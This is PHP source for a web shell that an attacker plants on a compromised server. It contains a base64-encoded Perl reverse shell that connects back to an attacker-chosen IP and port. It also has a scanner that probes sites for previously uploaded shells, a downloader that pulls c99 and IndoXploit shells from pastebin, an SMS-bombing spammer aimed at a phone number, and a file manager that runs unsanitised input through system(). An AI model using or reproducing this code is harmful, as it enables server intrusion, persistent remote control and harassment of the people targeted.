$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7"; if(isset($_POST['sub_bc'])) { $f_bc = fopen("/tmp/bc.pl", "w"); fwrite($f_bc, base64_decode($bind_connect_p)); fclose($f_bc); $ipbc = $_POST['ip_bc']; $port = $_POST['port_bc']; $out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &"); sleep(1); echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>"; unlink("/tmp/bc.pl"); } } ?>
<?php if(isset($_GET['shellfind'])) { echo'<center>
  <br><center><b>-=Search Shells uploaded=-</b><br>
  <img src="http://www11.0zz0.com/2014/08/22/21/592562836.png">
  <p align="center"></p><br>
  <form method="POST">
  </form><center>
  <form action="" method="post">
  <input class="inputz" name="traget" type="text" size="100" value="http://www.site.com/"/><br>
  <br><br>
  <input  class="inputz" name="scan" size="100" value="Start Scaning" type="submit">
  </form><script><br>'; set_time_limit(0); if (isset($_POST["scan"])) { $url = $_POST['traget']; echo "</script><br /><span class='start'>Scanning ".$url."<br /><br /></span>"; echo "ReSulT:<br /><br /><script>"; $shells = array("default.php","008.php","kimak.php","mini.php","noname.php", "0z.php","ngidx.php","config.php","asu.php","extremecrw.php","home.phtml","home.php","tamvan.phtml","sad.php","kalemtod.php","idx.php","WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php", "x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php", "Cgishell.pl","killer.php","akses.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php", "vb.zip","r00t.php","c99.php","webshell.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php", "d0mains.php","wp-content/plugins/akismet/akismet.php","madspotshell.php","Sym.php","c22.php","c100.php", "wp-content/plugins/akismet/admin.php#","wp-content/plugins/google-sitemap-generator/sitemap-core.php#", "wp-content/plugins/akismet/widget.php#","Cpanel.php","zone-h.php","tmp/user.php","tmp/Sym.php","cp.php", "tmp/madspotshell.php","tmp/root.php","tmp/whmcs.php","tmp/index.php","tmp/2.php","tmp/dz.php","tmp/cpn.php", "tmp/changeall.php","tmp/Cgishell.pl","tmp/sql.php","tmp/admin.php","cliente/downloads/h4xor.php", "whmcs/downloads/dz.php","L3b.php","d.php","tmp/d.php","tmp/L3b.php","wp-content/plugins/akismet/admin.php", "templates/rhuk_milkyway/index.php","templates/beez/index.php","admin1.php","upload.php","up.php","vb.zip","vb.rar", "admin2.asp","uploads.php","sa.php","sysadmins/","admin1/","administration/Sym.php","images/Sym.php", "/r57.php","/wp-content/plugins/disqus-comment-system/disqus.php","/shell.php","/sa.php","/admin.php", "/sa2.php","/2.php","/gaza.php","/up.php","/upload.php","/uploads.php","/templates/beez/index.php","shell.php","/amad.php", "/t00.php","/dz.php","/site.rar","/Black.php","/site.tar.gz","/home.zip","/home.rar","/home.tar","/home.tar.gz", "/forum.zip","/forum.rar","/forum.tar","/forum.tar.gz","/test.txt","/ftp.txt","/user.txt","/site.txt","/error_log","/error", "/cpanel","/awstats","/site.sql","/vb.sql","/forum.sql","/backup.sql","/back.sql","/data.sql","wp.rar/", "wp-content/plugins/disqus-comment-system/disqus.php","asp.aspx","/templates/beez/index.php","tmp/vaga.php", "tmp/killer.php","whmcs.php","tmp/killer.php","tmp/domaine.pl","tmp/domaine.php","useradmin/", "tmp/d0maine.php","d0maine.php","tmp/sql.php","tmp/dz1.php","dz1.php","forum.zip","Symlink.php","Symlink.pl", "forum.rar","joomla.zip","joomla.rar","wp.php","buck.sql","sysadmin.php","images/c99.php", "xd.php", "c100.php", "spy.aspx","xd.php","tmp/xd.php","sym/root/home/","billing/killer.php","tmp/upload.php","tmp/admin.php", "Server.php","tmp/uploads.php","tmp/up.php","Server/","wp-admin/c99.php","tmp/priv8.php","priv8.php","cgi.pl/", "tmp/cgi.pl","downloads/dom.php","templates/ja-helio-farsi/index.php","webadmin.html","admins.php", "/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php",".php","a.php","crot.php","kontol.php","hmei7.php"); foreach ($shells as $shell){ $headers = get_headers("$url$shell"); if (eregi('200', $headers[0])) { echo "</script><a href='$url$shell'>$url$shell</a> <span class='found'>Done :D</span><br /><br/><br/>"; $dz = fopen('shells.txt', 'a+'); $suck = "$url$shell"; fwrite($dz, $suck."\n"); } } echo "You Will Find Shell'z here [ <a href='./shell.txt' target='_blank'>shell.txt</a> ]</span><script>"; } } ?>
<?php function getfile($name) { if($name === "adminer") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php"); if($name === "indoxploit") $get = array("https://pastebin.com/raw/UJLd1DpM", "idx.php"); if($name === "noname") $get = array("https://pastebin.com/raw/Pg3PnEir", "noname.php"); if($name === "priv8") $get = array("https://pastebin.com/raw/7UM5eku8", "0z.php"); if($name === "c99") $get = array("https://pastebin.com/raw/hPzPr5A6", "mini.php"); $fp = fopen($get[1], "w"); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $get[0]); curl_setopt($ch, CURLOPT_BINARYTRANSFER, true); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_FILE, $fp); return curl_exec($ch); curl_close($ch); fclose($fp); ob_flush(); flush(); } ?>
<?php if(isset($_GET['adminer'])) { $adminerr = getfile('adminer'); if($adminerr){ echo "<center><a href='adminer.php' target='_blank'>Done!!!</a><script>"; }else{ echo "</script><center>Permission Denied!<script>"; } print "$adminerr"; } ?>
<?php if(isset($_GET['spawnshell'])) { echo "<center><form method='GET' action='?spawnshell'>
  <select name='spawnshell'>
  <option value='indoxploit'>IndoXploit Shell v3</option>
  <option value='noname'>NoName Shell</option>
  <option value='priv8'>Mini Priv8 Shell</option>
  <option value='c99'>C99 Shell</option>
  </select>
  <input type='submit' name='spawn' value='Spawn!'>
  </form><script>"; if($_GET['spawn']) { echo "</script>"; $shellnya = $_GET['spawnshell']; $shellnjing = getfile($shellnya); if($shellnya === "indoxploit"){ echo "<a href='idx.php'>Done!!</a><br>Pass: IndoXploit<script>"; print $shellnjing; }elseif($shellnya === "noname"){ echo "<a href='nn.php'>Done!!</a><br>Pass: zeeblaxx<script>"; print $shellnjing; }elseif($shellnya === "priv8"){ echo "<a href='0z.php'>Done!!</a><script>"; print $shellnjing; }elseif($shellnya === "c99"){ echo "<a href='mini.php'>Done!!</a><script>"; print $shellnjing; } }else{ echo "Permission Denied!"; } } ?>
<?php if(isset($_GET['deldir'])) { $deletedir=$_GET['deldir']; if(rmdir($deletedir)){ echo "Directory Deleted!<script>"; }else{ echo "Permission Denied!<script>"; } } ?>
<?php if(isset($_GET['rename'])) { $cwd = $_GET['dir']; $kimak = $_GET['rename']; $new = $_GET['newname']; echo "<form action='?dir=$cwd&rename' method='GET'>
  <input type='hidden' name='dir' value='$cwd'>
  <input type='hidden' name='rename' value=$kimak><br>
  <input type='text' name='newname' value='New Name'>
  <input type='submit' name='renamed' value='Rename!'></form><script>"; if($_GET['renamed']) { $hajar = rename ("$kimak","$cwd/$new"); if($hajar) { $hajar1 = "</script><script>window.location='?dir=$cwd';</script>"; } else{ $hajar1 = "</script>Rename Failed!<script>"; } print "$hajar1"; } } ?>
<?php if(isset($_GET['makedir'])) { $cwd=$_GET['dir']; echo "<center>
  <form action='?dir=$cwd&makedir' method=GET>
  <input type=hidden name='dir' value='$cwd'>
  <input type=text name='newdir' value='$cwd/newdir'>
  <input type=submit name=makedir value=Submit>
  </form><script>"; if($_GET['makedir']){ $newdir=$_GET['newdir']; if(mkdir($newdir)){ echo "</script><script>window.location='?dir=$cwd';</script>"; }else{ echo "Permission Denied!"; } } } ?>
<?php if(isset($_GET['sms'])) { function jdidbom($no, $jum, $wait){ $x = 0; while($x < $jum) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html'); curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'); $server_output = curl_exec ($ch); curl_close ($ch); echo $server_output."\n"; sleep($wait); $x++; flush(); } } echo '
  <center><font size="4">
  SMS Spammer JD.ID<br>
  By Cy#b3r00T
  <form action="" method="POST"><pre>
      Nomor:<input type="text" name="nomor" placeholder="08xxxxxxxx69">
  Jumlah:<input type="number" name="jumlah" placeholder="1-9999">
    Jeda:<input type="number" name="jeda" placeholder="1-10">
       <input type="submit" name="hajar" value="Spam!"></pre></form>'; $no = $_POST['nomor']; $jum = $_POST['jumlah']; $wait = $_POST['jeda']; echo "<font size='4'><pre>
  Set Target: $no
  Set Jumlah: $jum
  Set Delay : $wait<br>
  Output:
  <br>"; $execute = jdidbom($no, $jum, $wait); print $execute; echo '<script>'; } ?>
<?php if(isset($_GET['newfile'])) { $cwd=$_GET['dir']; echo "<center>
  <form action=?newfile method=GET>
  <input type=hidden name=dir value='$cwd'>
  <input type=text name=newfile value='$cwd/file.txt'>
  <input type=submit name=makefile value=Submit>
  </form><script>"; if($_GET['makefile']){ $filenya=$_GET['newfile']; $kampank="echo '' > $filenya"; echo '</script>'; if(system("$kampank")){ echo "Permission Denied!"; }else{ echo "<script>window.location='?edit=$filenya';</script>"; } } } ?>
<?php if(isset($_GET['filesrc'])){ echo "<tr><td>Current File : "; echo $_GET['filesrc']; echo '<hr size="1">'; echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre><script>'); } ?><center><a href="https://privdayz.com/"><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></a></center>
<?php if(isset($_GET['del'])) { $file=$_GET['del']; if(@unlink($file)) { echo 'Sukses Menghapus File<script>'; }else{ echo 'Gagal Menghapus File<script>'; } } ?>
</pre>
<?php echo '<pre><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>
Current Directory :'; if(isset($_GET['dir'])){ $path = $_GET['dir']; }else{ $path = getcwd(); } $path = str_replace('\\','/',$path); $paths = explode('/',$path); foreach($paths as $id=>$pat){ $a = true; if($pat == '' && $id == 0){ echo '<a href="?dir=/">/</a>'; continue; } if($pat == '') continue; echo '<a href="?dir='; for($i=0;$i<=$id;$i++){ echo "$paths[$i]"; if($i != $id) echo "/"; } echo '">'.$pat.'</a>/'; }echo '<p align=right><font color=#8B0101>< </font><a href=?dir='.$path.'&makedir>New Directory</a><font color=#8B0101> ></font>&nbsp&nbsp&nbsp<font color=#8B0101>< </font><a href=?dir='.$path.'&newfile>New File</a><font color=#8B0101> ></font>&nbsp&nbsp&nbsp</p>'; echo "</td></table><table width=100% border=0 cellpadding=7 cellspacing=0 align=center>
<tr>
  <th width=200>Name</th>
  <th width=200> Type</th>
  <th width=200>Size</th>
  <th width=200>Permission</th>
  <th>Option</th>
</tr><tr>"; $scandir = scandir($path); foreach($scandir as $dir){ if(!is_dir($path.'/'.$dir) || $dir == '.z' || $dir == '..z') { $size=filesize($dir)/1024; $size = round($size,3); if($size >= 1024){ $size = round($size/1024,2).' MB'; }else{ $size = $size.' KB'; } $s = filetype("$path/$dir"); echo "<td><a href='?filesrc=$path/$dir'>$dir</a><br></td><td>$s</td><td>$size</td><td>".perms($dir)."<td>
  <a href='$PHP_SELF?edit=$path/$dir'>Edit</a> | <a href='$PHP_SELF?del=$path/$dir'>Delete</a> | <a href='$PHP_SELF?dir=$path&rename=$path/$dir'>Rename</a></td></tr>"; }else{ $s = filetype("$path/$dir"); echo "<td><a href='?dir=$path/$dir'>$dir</a><br></td><td>$s</td><td>--</td><td>".perms($path)."</td><td><a href='$PHP_SELF?deldir=".$path."/".$dir."'>Delete</a> | <a href='$PHP_SELF?dir=$path&rename=$path/$dir'>Rename</a></td></tr>"; } } ?>